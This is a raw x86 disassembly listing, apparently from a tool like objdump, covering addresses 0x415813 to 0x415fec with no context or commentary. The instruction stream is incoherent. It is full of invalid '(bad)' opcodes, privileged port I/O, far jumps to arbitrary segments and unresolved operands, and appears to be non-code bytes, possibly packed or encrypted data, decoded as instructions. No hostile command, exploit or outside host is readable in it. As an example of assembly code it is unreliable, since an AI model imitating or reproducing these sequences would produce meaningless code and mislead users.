  415813:	ds jge 0x415833
  415816:	push   ecx
  415817:	add    al,0xda
  415819:	cdq    
  41581a:	mov    esp,0x39d0a9c6
  41581f:	aam    0x6a
  415821:	in     eax,0xb0
  415823:	jo     0x415814
  415825:	mov    bl,al
  415827:	pop    ebx
  415828:	or     al,0x95
  41582a:	push   esp
  41582b:	jne    0x415849
  41582d:	sub    ah,dl
  41582f:	retf   
  415830:	mov    eax,ds:0xa61dc380
  415835:	fs repz add eax,0xd7de28f9
  41583c:	xchg   edx,eax
  41583d:	push   eax
  41583e:	xchg   esp,eax
  41583f:	lea    edi,[eax+eax*8-0x7b]
  415843:	ins    DWORD PTR es:[edi],dx
  415844:	sbb    ecx,ebx
  415846:	in     al,0xb7
  415848:	or     ah,al
  41584a:	mov    ah,ch
  41584c:	pushf  
  41584d:	fbstp  TBYTE PTR [esi-0xb41e297]
  415853:	aam    0x27
  415855:	mov    ?,WORD PTR [ebp+0x1bc85b55]
  41585b:	push   ss
  41585c:	mov    bl,0xa6
  41585e:	mov    esi,?
  415860:	add    eax,0x81517ff
  415865:	or     edx,DWORD PTR [ecx]
  415867:	xor    BYTE PTR [esi+0x71],ah
  41586a:	cmp    DWORD PTR [ebp+0x6a],edi
  41586d:	xlat   BYTE PTR ds:[ebx]
  41586e:	push   edx
  41586f:	inc    esp
  415870:	mov    eax,0x9ec31530
  415875:	sbb    al,0x9f
  415877:	xlat   BYTE PTR ds:[ebx]
  415878:	and    ah,bh
  41587a:	shr    DWORD PTR [esi+eax*4+0x9],1
  41587e:	in     eax,0xf0
  415880:	mov    cl,0xe7
  415882:	jbe    0x41585c
  415884:	ss xchg ecx,eax
  415886:	js     0x4158b1
  415888:	out    dx,al
  415889:	add    ebp,DWORD PTR [eax+0x77]
  41588c:	and    dh,ah
  41588e:	outs   dx,BYTE PTR ds:[esi]
  41588f:	jp     0x41587c
  415891:	mov    al,ds:0xc8227cda
  415896:	mov    ah,0x29
  415898:	xchg   ebx,eax
  415899:	add    BYTE PTR [ebp+ecx*1+0x4c],0x5d
  41589e:	add    dh,BYTE PTR ds:0xc85f0c7c
  4158a4:	pop    eax
  4158a5:	adc    ebx,DWORD PTR [ebp-0x5d]
  4158a8:	scas   al,BYTE PTR es:[edi]
  4158a9:	xchg   esi,eax
  4158aa:	cld    
  4158ab:	jl     0x4158aa
  4158ad:	push   0xecadb099
  4158b2:	adc    al,0x81
  4158b4:	xchg   esp,eax
  4158b5:	cwde   
  4158b6:	xchg   BYTE PTR [esi],bh
  4158b8:	cmp    al,0x55
  4158ba:	fwait
  4158bb:	jl     0x415859
  4158bd:	mov    ebp,0x7f928911
  4158c2:	sub    eax,0x24fd5e49
  4158c7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158c9:	xchg   ebp,eax
  4158ca:	cmp    al,0xa5
  4158cc:	fsubr  st(6),st
  4158ce:	int3   
  4158cf:	loope  0x4158f6
  4158d1:	and    eax,0x864edfc
  4158d6:	jecxz  0x415915
  4158d8:	test   ebx,ecx
  4158da:	dec    ebx
  4158db:	je     0x415908
  4158dd:	ficomp DWORD PTR [eax+0x34483d1c]
  4158e3:	lods   eax,DWORD PTR ds:[esi]
  4158e4:	rcl    bl,1
  4158e6:	pop    ebp
  4158e7:	sbb    BYTE PTR [ecx+edi*2+0x57043851],0xb1
  4158ef:	add    al,0x88
  4158f1:	push   esi
  4158f2:	clc    
  4158f3:	or     DWORD PTR [edx+0x47b37707],edx
  4158f9:	sbb    al,0xdf
  4158fb:	sbb    bl,BYTE PTR [esi+0x8]
  4158fe:	sbb    ebp,DWORD PTR [ebx+0x2eabc29c]
  415904:	jb     0x415910
  415906:	arpl   WORD PTR [ebx],si
  415908:	xchg   WORD PTR [edx+0x13],dx
  41590c:	xchg   ebp,eax
  41590d:	ja     0x41591a
  41590f:	gs dec esp
  415911:	adc    DWORD PTR [edx],eax
  415913:	(bad)  
  415914:	cli    
  415915:	jmp    0x4158ff
  415917:	jmp    0x6ea291f8
  41591c:	xchg   ecx,eax
  41591d:	or     ch,bl
  41591f:	retf   0xb24f
  415922:	pop    ds
  415923:	call   0xb5e8f2b3
  415928:	sub    ebx,DWORD PTR [eax]
  41592a:	jo     0x415900
  41592c:	pop    ebp
  41592d:	(bad)  
  41592e:	xchg   ebp,eax
  41592f:	mov    esp,0xc03668a6
  415934:	cwde   
  415935:	dec    eax
  415936:	(bad)  
  415937:	out    0x5b,eax
  415939:	push   0xb62ec204
  41593e:	jmp    0xccc4d027
  415943:	cld    
  415944:	call   0x39ee19fb
  415949:	iret   
  41594a:	push   0xd0c6e55c
  41594f:	mov    ds:0x7d198763,eax
  415954:	push   ebp
  415955:	loop   0x4158fb
  415957:	push   cs
  415958:	and    BYTE PTR [ebp-0x23356f36],0x3b
  41595f:	sti    
  415960:	jge    0x41597f
  415962:	fnstenv ds:0x9132c449
  415968:	fucom  st(1)
  41596a:	mov    esi,0x53ce6907
  41596f:	add    DWORD PTR [esi],esp
  415971:	push   ds
  415972:	push   0xffffffbc
  415974:	jmp    0x4159cd
  415976:	cmp    DWORD PTR [edi+0x10],edi
  415979:	xor    al,0xe3
  41597b:	push   edx
  41597c:	xchg   ebp,eax
  41597d:	or     ah,BYTE PTR [edi-0x13]
  415980:	fbstp  TBYTE PTR [ecx-0x65]
  415983:	lock adc bh,BYTE PTR [edx]
  415986:	jp     0x4159a4
  415988:	fistp  WORD PTR [edi-0x14]
  41598b:	mov    eax,ds:0x8d6435b
  415990:	repz (bad) 
  415992:	inc    ebp
  415993:	ss or  eax,0x2320a2a5
  415999:	mov    ebx,0xa70a0bdd
  41599e:	js     0x4159b1
  4159a0:	mov    bh,0xde
  4159a2:	adc    eax,0xd35e7865
  4159a7:	sti    
  4159a8:	jg     0x4159ae
  4159aa:	fnstcw WORD PTR [eax+edi*8+0x2b]
  4159ae:	xor    DWORD PTR [edx],eax
  4159b0:	xor    ecx,DWORD PTR [edx+0x14]
  4159b3:	fucomip st,st(1)
  4159b5:	ret    
  4159b6:	sbb    ch,BYTE PTR [ebx-0xe]
  4159b9:	es or  ch,dl
  4159bc:	sbb    DWORD PTR [esi-0xa1c2586],edx
  4159c2:	jecxz  0x4159fa
  4159c4:	scas   al,BYTE PTR es:[edi]
  4159c5:	push   eax
  4159c6:	idiv   BYTE PTR ds:0x8819947b
  4159cc:	mov    bl,0xb7
  4159ce:	push   ss
  4159cf:	fcomi  st,st(0)
  4159d1:	mov    esi,0x7de38b71
  4159d6:	mov    ebx,?
  4159d8:	(bad)  
  4159d9:	jbe    0x415a07
  4159db:	inc    edi
  4159dc:	or     al,0x7c
  4159de:	pop    eax
  4159df:	mov    dh,0x96
  4159e1:	cmp    WORD PTR [edi+0x355aa9c7],cx
  4159e8:	stos   BYTE PTR es:[edi],al
  4159e9:	xor    BYTE PTR [ebp+0x35],ah
  4159ec:	leave  
  4159ed:	shr    esi,0x17
  4159f0:	hlt    
  4159f1:	mov    ah,ah
  4159f3:	les    ebx,FWORD PTR [edx+0x553e2c25]
  4159f9:	push   es
  4159fa:	jle    0x4159cf
  4159fc:	icebp  
  4159fd:	mov    edx,DWORD PTR [esi]
  4159ff:	dec    edx
  415a00:	inc    edx
  415a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a03:	gs push edi
  415a05:	mov    eax,ds:0xd297aeff
  415a0a:	xor    eax,0x7e3a1de6
  415a0f:	jge    0x415a4e
  415a11:	test   al,0xac
  415a13:	fsub   QWORD PTR [edx]
  415a15:	jne    0x4159f7
  415a17:	inc    edi
  415a18:	ror    bh,0x5d
  415a1b:	or     BYTE PTR [eax+0x28981825],0x7c
  415a22:	or     BYTE PTR [edx],dh
  415a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a25:	xlat   BYTE PTR ds:[ebx]
  415a26:	leave  
  415a27:	mov    cl,0x64
  415a29:	out    dx,eax
  415a2a:	sbb    ebp,DWORD PTR [edi+0x319bd738]
  415a30:	lods   eax,DWORD PTR ds:[esi]
  415a31:	and    DWORD PTR [edi-0x13],ecx
  415a34:	out    dx,al
  415a35:	ret    0x8428
  415a38:	outs   dx,BYTE PTR ds:[esi]
  415a39:	data16 mov dh,0x39
  415a3c:	push   ebx
  415a3d:	and    DWORD PTR [eax],esi
  415a3f:	pushf  
  415a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a41:	loopne 0x415a91
  415a43:	icebp  
  415a44:	cli    
  415a45:	add    DWORD PTR [ebp-0x62282e27],ebx
  415a4b:	cmp    al,0x1b
  415a4d:	and    edx,DWORD PTR [eiz*4-0x1e79635e]
  415a54:	js     0x4159f1
  415a56:	scas   eax,DWORD PTR es:[edi]
  415a57:	call   0x4d08:0xa198eddc
  415a5e:	loop   0x415a2f
  415a60:	mov    bl,0x3f
  415a62:	jmp    0x2b68:0x54acf46e
  415a69:	loop   0x415aad
  415a6b:	push   0x2b
  415a6d:	fisubr WORD PTR [edi]
  415a6f:	ss dec esp
  415a71:	sbb    al,0x80
  415a73:	push   ebp
  415a74:	jecxz  0x415a1b
  415a76:	pmaddwd mm1,QWORD PTR [esi-0x37]
  415a7a:	push   esp
  415a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a7c:	pop    ecx
  415a7d:	pushf  
  415a7e:	or     bl,ah
  415a80:	mov    es,ebx
  415a82:	lock in eax,0x95
  415a85:	out    0x8f,eax
  415a87:	jmp    0xfe2db6b4
  415a8c:	mov    ah,0xe0
  415a8e:	and    ebx,ecx
  415a90:	rol    DWORD PTR [edx-0x70089e62],0x7a
  415a97:	push   edi
  415a98:	cdq    
  415a99:	and    dh,0x1b
  415a9c:	dec    ebp
  415a9d:	stos   DWORD PTR es:[edi],eax
  415a9e:	lea    ebp,[esi-0x3762d825]
  415aa4:	sbb    eax,0x92faa584
  415aa9:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  415aab:	adc    eax,0x1b8708ae
  415ab0:	fcmove st,st(3)
  415ab2:	std    
  415ab3:	and    BYTE PTR [esi-0x2c5344f6],0xf0
  415aba:	mov    bl,0x97
  415abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415abd:	jmp    0x7c53687c
  415ac2:	das    
  415ac3:	fmul   QWORD PTR ds:0x8b04adf9
  415ac9:	adc    DWORD PTR [ebp+ebx*4-0x4c],esi
  415acd:	sahf   
  415ace:	or     eax,0x60a2673
  415ad3:	mov    dl,BYTE PTR [ecx]
  415ad5:	mov    ss,eax
  415ad7:	add    al,0x9a
  415ad9:	pop    edx
  415ada:	or     eax,0x9bd8875
  415adf:	mov    al,ds:0x4632bb6d
  415ae4:	cmc    
  415ae5:	mov    cl,0x41
  415ae7:	imul   eax,esp,0x7a
  415aea:	and    eax,0x18372862
  415aef:	fld    DWORD PTR [ecx+0x266e059b]
  415af5:	sbb    dh,BYTE PTR [ecx+0x0]
  415af8:	test   DWORD PTR [eax-0x17024c56],esp
  415afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aff:	dec    edx
  415b00:	fsub   st(3),st
  415b02:	add    bl,bl
  415b04:	(bad)  
  415b05:	mov    eax,ds:0x109021b9
  415b0a:	mov    bh,0x89
  415b0c:	leave  
  415b0d:	fadd   QWORD PTR [ecx+esi*4+0x4fec5d01]
  415b14:	popf   
  415b15:	nop
  415b16:	aam    0x95
  415b18:	xor    edx,DWORD PTR [eax+0x74]
  415b1b:	(bad)  
  415b1c:	jmp    0x415af9
  415b1e:	mov    bh,0xae
  415b20:	mov    DWORD PTR [edi-0x56],ecx
  415b23:	pop    edx
  415b24:	std    
  415b25:	(bad)  
  415b26:	push   cs
  415b27:	out    dx,al
  415b28:	retf   
  415b29:	xor    dl,BYTE PTR [ecx+0x32568517]
  415b2f:	xor    DWORD PTR [eax-0x178c69cb],eax
  415b35:	adc    BYTE PTR [ecx+0x148349a1],ch
  415b3b:	push   ds
  415b3c:	pop    ss
  415b3d:	cmp    ah,BYTE PTR [ebx+0x50]
  415b40:	ss popf 
  415b42:	jae    0x415ad8
  415b44:	out    dx,eax
  415b45:	mov    al,ds:0x2babdec6
  415b4a:	inc    edi
  415b4b:	and    BYTE PTR [ebp-0x73f6310],dl
  415b51:	inc    edx
  415b52:	repz adc cl,0x27
  415b56:	cmp    BYTE PTR [eax-0xb],al
  415b59:	hlt    
  415b5a:	xchg   ebp,eax
  415b5b:	loopne 0x415bad
  415b5d:	outs   dx,BYTE PTR ds:[esi]
  415b5e:	adc    al,0xee
  415b60:	or     edx,DWORD PTR [edi+0x27]
  415b63:	loopne 0x415bc7
  415b65:	sahf   
  415b66:	jmp    0x3d:0xf7b387ef
  415b6d:	std    
  415b6e:	sbb    BYTE PTR [ebx+0x38],cl
  415b71:	rcr    BYTE PTR [eax+0x34],1
  415b74:	shl    DWORD PTR [eax-0x3af5d022],cl
  415b7a:	pop    edx
  415b7b:	jb     0x415b0f
  415b7d:	outs   dx,BYTE PTR ds:[esi]
  415b7e:	mov    ch,BYTE PTR [edx+0x4]
  415b81:	pop    eax
  415b82:	inc    ecx
  415b83:	dec    eax
  415b84:	aam    0xc5
  415b86:	sub    al,0xf9
  415b88:	add    eax,0x9895dc25
  415b8d:	xchg   BYTE PTR [edi],dl
  415b8f:	cld    
  415b90:	push   ebp
  415b91:	mov    al,0x4
  415b93:	ret    
  415b94:	cmc    
  415b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b96:	xchg   DWORD PTR [edi+0x776d4881],edx
  415b9c:	(bad)  
  415b9d:	mov    ebp,0x9e848a2b
  415ba2:	test   eax,0x9ef7d1a3
  415ba7:	stc    
  415ba8:	inc    eax
  415ba9:	shl    ah,0x81
  415bac:	cli    
  415bad:	dec    edx
  415bae:	inc    edi
  415baf:	jmp    0x194a:0x9103aa87
  415bb6:	js     0x415b63
  415bb8:	popf   
  415bb9:	gs inc ecx
  415bbb:	xchg   esp,eax
  415bbc:	arpl   WORD PTR [ebx-0x7a],ax
  415bbf:	out    0x81,al
  415bc1:	mov    eax,0x1529ceeb
  415bc6:	cmp    dl,BYTE PTR [ebp-0x468a2f21]
  415bcc:	out    0xa6,eax
  415bce:	xor    BYTE PTR [eax+0x37295622],ch
  415bd4:	ins    BYTE PTR es:[edi],dx
  415bd5:	pop    esp
  415bd6:	xor    dh,BYTE PTR [eax+0x664e7d3b]
  415bdc:	sti    
  415bdd:	cwde   
  415bde:	pop    ss
  415bdf:	fmul   QWORD PTR [ecx-0x78]
  415be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415be3:	imul   eax,DWORD PTR [esp+eax*1+0x2b4606de],0x79
  415beb:	mov    al,0x27
  415bed:	cwde   
  415bee:	aas    
  415bef:	inc    ecx
  415bf0:	jmp    0x2b6b26c7
  415bf5:	mul    BYTE PTR [edx+0x73d1e7b3]
  415bfb:	mov    esi,?
  415bfd:	pop    ss
  415bfe:	stc    
  415bff:	addr16 mov esp,0x47ab6f00
  415c05:	xchg   ecx,esi
  415c07:	rol    DWORD PTR [eax],0xfa
  415c0a:	mov    ebx,0x2f9437f6
  415c0f:	mov    ecx,0xce3882e5
  415c14:	cmp    BYTE PTR [edx],bl
  415c16:	cmp    cl,BYTE PTR [ebx+0x3]
  415c19:	mov    bl,0x65
  415c1b:	dec    ecx
  415c1c:	rcl    DWORD PTR [esi-0x26e1fe06],1
  415c22:	jb     0x415c6e
  415c24:	faddp  st(6),st
  415c26:	adc    bl,ch
  415c28:	xor    BYTE PTR [ebx+ecx*4],bh
  415c2b:	pushf  
  415c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c2d:	mov    ebp,0x3e9ccb82
  415c32:	stos   BYTE PTR es:[edi],al
  415c33:	repnz pop ebp
  415c35:	in     eax,dx
  415c36:	test   al,0xb4
  415c38:	call   0x9e051ff9
  415c3d:	outs   dx,DWORD PTR ds:[esi]
  415c3e:	mov    al,ds:0x390b5d5
  415c43:	inc    esp
  415c44:	sbb    DWORD PTR ds:0x538e1e44,0x1085904e
  415c4e:	test   al,0xc3
  415c50:	je     0x415c67
  415c52:	cmp    ecx,edi
  415c54:	aaa    
  415c55:	sbb    ebp,DWORD PTR [eax+0x54]
  415c58:	adc    ecx,DWORD PTR [edi]
  415c5a:	je     0x415cc2
  415c5c:	dec    edi
  415c5d:	data16 mov ah,0x3f
  415c60:	push   0x537020fd
  415c65:	mov    esi,0x3802d1b
  415c6a:	fidiv  WORD PTR [edi-0x1a]
  415c6d:	jge    0x415cb3
  415c6f:	or     BYTE PTR [edi-0x66],dl
  415c72:	adc    DWORD PTR ds:0xc5113768,0x5173c6b8
  415c7c:	retf   
  415c7d:	adc    eax,0x64da2dc0
  415c82:	outs   dx,DWORD PTR ds:[esi]
  415c83:	ror    DWORD PTR [esi],cl
  415c85:	shl    BYTE PTR [ecx+0x4460f82d],1
  415c8b:	test   DWORD PTR [esi+0x803786a],ebx
  415c91:	mov    edx,0x18ef537a
  415c96:	loope  0x415cd0
  415c98:	xor    bl,BYTE PTR [ebp+0xb]
  415c9b:	mov    eax,ds:0x6bd561ef
  415ca0:	pop    ebx
  415ca1:	and    DWORD PTR [ebp+edi*1+0x2e321193],edi
  415ca8:	push   ds
  415ca9:	gs add al,0x52
  415cac:	shr    BYTE PTR [eax],cl
  415cae:	add    BYTE PTR [ecx+0x48],0xa8
  415cb2:	sbb    eax,0x3ec3739f
  415cb7:	pop    edi
  415cb8:	mov    al,0x65
  415cba:	int    0xbf
  415cbc:	mov    esp,0x29f31f4f
  415cc1:	in     al,dx
  415cc2:	lds    eax,FWORD PTR [ebp-0xa1cac42]
  415cc8:	mov    al,ds:0x7684e898
  415ccd:	mov    ah,0xb9
  415ccf:	(bad)  
  415cd0:	mov    ds:0xa5af54d8,al
  415cd5:	out    dx,eax
  415cd6:	nop
  415cd7:	xchg   esi,eax
  415cd8:	and    al,0x79
  415cda:	rcl    BYTE PTR [ebx+0x625f2141],0xa5
  415ce1:	and    edx,esp
  415ce3:	xor    al,0xdc
  415ce5:	cmp    bl,BYTE PTR [ebx-0x20d652aa]
  415ceb:	mov    ch,0xc8
  415ced:	push   edi
  415cee:	jnp    0x415d2f
  415cf0:	int    0x74
  415cf2:	int    0x2
  415cf4:	xchg   edx,eax
  415cf5:	add    ecx,edi
  415cf7:	xor    eax,0x7dbbac9b
  415cfc:	mov    dh,0xdb
  415cfe:	nop
  415cff:	(bad)  
  415d00:	fs sbb ah,dl
  415d03:	ss inc ebp
  415d05:	inc    edx
  415d06:	push   ds
  415d07:	jp     0x415d84
  415d09:	sub    ch,dl
  415d0b:	pop    es
  415d0c:	dec    eax
  415d0d:	mov    ah,0x85
  415d0f:	inc    ebp
  415d10:	mov    esp,0xadb7c95e
  415d15:	lds    edi,FWORD PTR [eax]
  415d17:	push   edx
  415d18:	leave  
  415d19:	xchg   edi,eax
  415d1a:	cmp    eax,0x49504435
  415d1f:	jge    0x415d48
  415d21:	cwde   
  415d22:	pop    ebx
  415d23:	in     al,0xf1
  415d25:	inc    ebp
  415d26:	push   edx
  415d27:	retf   
  415d28:	xor    BYTE PTR [ebx-0x4f3bd258],ch
  415d2e:	fld    TBYTE PTR [eax+eax*1-0x66bfbcc3]
  415d35:	out    0x37,eax
  415d37:	lods   al,BYTE PTR ds:[esi]
  415d38:	push   ecx
  415d39:	cwde   
  415d3a:	mov    ah,0xd5
  415d3c:	imul   eax,DWORD PTR [ebx],0xfffffff2
  415d3f:	mov    WORD PTR [ebp-0x72],ds
  415d42:	pushf  
  415d43:	test   eax,0xf2718109
  415d48:	pop    ecx
  415d49:	or     BYTE PTR [esi],dl
  415d4b:	mov    WORD PTR [edi+0x41],cs
  415d4e:	mov    bh,0x91
  415d50:	jb     0x415d3c
  415d52:	mov    esp,0x36f392ab
  415d57:	jg     0x415cfc
  415d59:	xor    BYTE PTR ds:0x7a731e3b,cl
  415d5f:	sbb    al,0x2c
  415d61:	test   dh,0x92
  415d64:	(bad)  
  415d65:	popa   
  415d66:	enter  0x4ae9,0xc5
  415d6a:	shl    DWORD PTR [ebx],0xc3
  415d6d:	inc    eax
  415d6e:	in     al,dx
  415d6f:	dec    cl
  415d71:	dec    edx
  415d72:	in     eax,dx
  415d73:	add    dl,bl
  415d75:	or     dh,dl
  415d77:	mov    esi,0x64ad18d9
  415d7c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  415d7e:	jg     0x415d6e
  415d80:	fs hlt 
  415d82:	lods   al,BYTE PTR ds:[esi]
  415d83:	and    ebx,esi
  415d85:	daa    
  415d86:	add    ebp,ebx
  415d88:	sub    DWORD PTR ds:0xacf5706,edx
  415d8e:	test   al,0xb7
  415d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d91:	and    dl,BYTE PTR [ebx]
  415d93:	shl    dl,1
  415d95:	nop
  415d96:	daa    
  415d97:	xchg   edx,eax
  415d98:	inc    ebp
  415d99:	inc    edx
  415d9a:	jne    0x415dd7
  415d9c:	dec    ebp
  415d9d:	and    cl,BYTE PTR ds:0x961a195e
  415da3:	sub    eax,0x6bd6430d
  415da8:	adc    eax,0x58d74df8
  415dad:	mov    edi,0x661674f3
  415db2:	mov    DWORD PTR [eax-0x29b4beab],0x887e069
  415dbc:	fisubr DWORD PTR [ebp+0x5649c53]
  415dc2:	popf   
  415dc3:	arpl   cx,sp
  415dc5:	or     DWORD PTR [ebx+0x650606c2],edx
  415dcb:	stos   DWORD PTR es:[edi],eax
  415dcc:	push   ebx
  415dcd:	xor    DWORD PTR [edi-0x651ad297],0xffffffb5
  415dd4:	sar    DWORD PTR [edx+0x7382cad1],cl
  415dda:	jmp    0x415dea
  415ddc:	shr    ecx,cl
  415dde:	(bad)
  415de2:	mov    al,ds:0xa66f9d02
  415de7:	test   al,0x7
  415de9:	sbb    edx,DWORD PTR [ecx]
  415deb:	(bad)  
  415dec:	in     eax,dx
  415ded:	push   ebx
  415dee:	test   BYTE PTR [eax+0x2dc60aa3],dh
  415df4:	pusha  
  415df5:	lock pop ss
  415df7:	ror    DWORD PTR [edx],cl
  415df9:	(bad)  
  415dfa:	jmp    DWORD PTR [ecx-0x67b22a88]
  415e00:	dec    esi
  415e01:	push   ss
  415e02:	dec    edi
  415e03:	inc    eax
  415e04:	cli    
  415e05:	push   0x1b9152d4
  415e0a:	xchg   edx,eax
  415e0b:	out    dx,eax
  415e0c:	pushf  
  415e0d:	push   ebx
  415e0e:	jp     0x415e43
  415e10:	retf   0xd05b
  415e13:	sbb    DWORD PTR [ebx-0x24],esi
  415e16:	in     al,dx
  415e17:	and    DWORD PTR [edx-0x9c4596c],esi
  415e1d:	loope  0x415de4
  415e1f:	sub    edi,DWORD PTR [esi]
  415e21:	and    eax,0x63fa7498
  415e26:	loope  0x415e71
  415e28:	lahf   
  415e29:	inc    ebx
  415e2a:	lahf   
  415e2b:	push   cs
  415e2c:	adc    ebx,edx
  415e2e:	inc    edi
  415e2f:	imul   ebp,DWORD PTR [ebp-0x5a],0xa94a026c
  415e36:	retf   
  415e37:	gs adc ebp,esp
  415e3a:	mov    ?,WORD PTR [edx+0x8]
  415e3d:	mov    dh,0x34
  415e3f:	sub    esp,DWORD PTR [eax+0x6a]
  415e42:	add    al,0x6d
  415e44:	mov    bh,0x99
  415e46:	add    ebx,DWORD PTR [edi+0x5104a7be]
  415e4c:	mov    ecx,0xd0f73a45
  415e51:	push   0xffffffff
  415e53:	int3   
  415e54:	push   es
  415e55:	iret   
  415e56:	and    ebp,edi
  415e58:	and    al,0xcf
  415e5a:	xchg   DWORD PTR [eax],esp
  415e5c:	jbe    0x415df3
  415e5e:	enter  0x9565,0x9b
  415e62:	call   0xbeee:0xfcfab3a4
  415e69:	lods   eax,DWORD PTR ds:[esi]
  415e6a:	cmp    BYTE PTR [eax+ebx*2],ch
  415e6d:	jecxz  0x415ead
  415e6f:	mov    DWORD PTR [esi-0x9e39d06],esi
  415e75:	aam    0x12
  415e77:	popa   
  415e78:	call   0x9c526e47
  415e7d:	fsubr  st(3),st
  415e7f:	dec    edi
  415e80:	inc    ecx
  415e81:	push   ebp
  415e82:	pop    esi
  415e83:	jnp    0x415edc
  415e85:	sbb    eax,0xd66df322
  415e8a:	aad    0x66
  415e8c:	add    al,0x8f
  415e8e:	out    dx,eax
  415e8f:	stos   DWORD PTR es:[edi],eax
  415e90:	mov    ds:0x8afee1e4,eax
  415e95:	sub    eax,0x6cffe3b5
  415e9a:	add    al,0x6f
  415e9c:	mov    WORD PTR [edi],?
  415e9e:	mov    al,ds:0x2495339f
  415ea3:	push   ebx
  415ea4:	in     eax,0x5a
  415ea6:	inc    ebp
  415ea7:	fnstcw WORD PTR [edx-0x4d]
  415eaa:	(bad)  
  415eac:	popa   
  415ead:	mov    ah,BYTE PTR [ebx+eiz*1]
  415eb0:	cmp    DWORD PTR ds:0xeff74fab,ebx
  415eb6:	jge    0x415ea7
  415eb8:	retf   0x244
  415ebb:	push   ebp
  415ebc:	add    edi,DWORD PTR [edi+0x66]
  415ebf:	ins    DWORD PTR es:[edi],dx
  415ec0:	jb     0x415ed2
  415ec2:	sbb    ecx,DWORD PTR [edi+0x4e]
  415ec5:	xchg   edi,eax
  415ec6:	imul   esi,DWORD PTR [eax+eax*1+0x35],0x3d0828ef
  415ece:	in     eax,0x19
  415ed0:	xor    bl,dl
  415ed2:	adc    al,0xd9
  415ed4:	xor    bh,BYTE PTR [eax]
  415ed6:	test   BYTE PTR cs:[esp+eax*1],al
  415eda:	adc    eax,0x1eea8a75
  415edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee0:	jmp    0x72a0:0x8985735c
  415ee7:	sar    BYTE PTR [esi-0x1e23bc47],0x4
  415eee:	icebp  
  415eef:	ins    BYTE PTR es:[edi],dx
  415ef0:	pop    eax
  415ef1:	inc    esi
  415ef2:	push   ds
  415ef3:	nop
  415ef4:	push   es
  415ef5:	dec    ebx
  415ef6:	mov    ebx,DWORD PTR [ebx+eiz*2+0x57]
  415efa:	push   ebp
  415efb:	adc    esi,DWORD PTR [ecx]
  415efd:	popf   
  415efe:	mov    dh,0xe
  415f00:	gs xchg ebx,eax
  415f02:	add    BYTE PTR [eax-0x66],0x39
  415f06:	cmp    eax,0xe4435ce2
  415f0b:	in     al,dx
  415f0c:	add    cl,BYTE PTR [ebx-0x4055a062]
  415f12:	retf   0x7d27
  415f15:	adc    edx,ebx
  415f17:	mov    ebx,0x67494ec2
  415f1c:	aam    0x5a
  415f1e:	mov    ds:0x153f3fb,al
  415f23:	cmp    BYTE PTR [ebx-0x4e],bl
  415f26:	pusha  
  415f27:	mov    dh,0x44
  415f29:	pop    esi
  415f2a:	mov    BYTE PTR [edi+0x2100fc32],0x51
  415f31:	mov    ds:0x319e5e8a,eax
  415f36:	shr    edx,0x9f
  415f39:	inc    eax
  415f3a:	mov    cl,BYTE PTR [esi]
  415f3c:	ror    esi,1
  415f3e:	push   ds
  415f3f:	(bad)  
  415f40:	pop    ds
  415f41:	and    eax,0xe3edbe76
  415f46:	mov    BYTE PTR [eax+0x8f64afb],bh
  415f4c:	(bad)  
  415f4d:	fisubr WORD PTR [esi-0x3d3ac2e2]
  415f53:	pop    ebx
  415f54:	sbb    ah,BYTE PTR ds:0x4b1cd977
  415f5a:	mov    cl,0x49
  415f5c:	pop    ss
  415f5d:	inc    eax
  415f5e:	adc    ch,BYTE PTR [ebx+0x38]
  415f61:	xchg   ecx,eax
  415f62:	scas   eax,DWORD PTR es:[edi]
  415f63:	fild   WORD PTR [edx+0x5]
  415f66:	into   
  415f67:	jp     0x415f0b
  415f69:	push   ebp
  415f6a:	dec    ebp
  415f6b:	pop    ds
  415f6c:	fst    DWORD PTR [ecx]
  415f6e:	in     eax,dx
  415f6f:	cmp    al,bh
  415f71:	sub    edi,DWORD PTR [ecx]
  415f73:	scas   al,BYTE PTR es:[edi]
  415f74:	sbb    BYTE PTR [ecx+0x5c],bl
  415f77:	push   edi
  415f78:	and    DWORD PTR [ecx+eiz*8-0xf],esp
  415f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f7d:	mov    bl,0xfc
  415f7f:	mov    esi,0x7bd8dd1f
  415f84:	dec    ebx
  415f85:	cmp    ch,bh
  415f87:	cmp    eax,0xa4cf5444
  415f8c:	jmp    0x5eace856
  415f91:	mov    eax,0x5771b3c9
  415f96:	sar    BYTE PTR ds:0x817b6357,0x5c
  415f9d:	cmp    eax,0xff7352d9
  415fa2:	fdiv   DWORD PTR [edi]
  415fa4:	sbb    dl,BYTE PTR [ecx-0x18ce12f5]
  415faa:	call   0x2e6a6bf9
  415faf:	xchg   ebp,eax
  415fb0:	psraw  mm6,QWORD PTR [edx+0x5760a137]
  415fb7:	stos   BYTE PTR es:[edi],al
  415fb8:	adc    esi,edx
  415fba:	cmp    eax,DWORD PTR [edx-0xe588738]
  415fc0:	(bad)  
  415fc1:	cmp    dl,BYTE PTR [ebx-0x80]
  415fc4:	xchg   ebx,eax
  415fc5:	cmp    eax,DWORD PTR [ebp+ebx*4+0x1b]
  415fc9:	xor    ebp,ebx
  415fcb:	scas   eax,DWORD PTR es:[edi]
  415fcc:	ja     0x415fe3
  415fce:	imul   ch
  415fd0:	xor    eax,0x403fb89f
  415fd5:	mov    bh,0xe8
  415fd7:	fdiv   st,st(5)
  415fd9:	dec    eax
  415fda:	mov    ch,0xd4
  415fdc:	mov    ecx,0x7c7d015d
  415fe1:	mov    eax,DWORD PTR [esi+ebp*8]
  415fe4:	div    DWORD PTR [edx+0x7eac1826]
  415fea:	jae    0x416032
  415fec:	jno    0x415f80
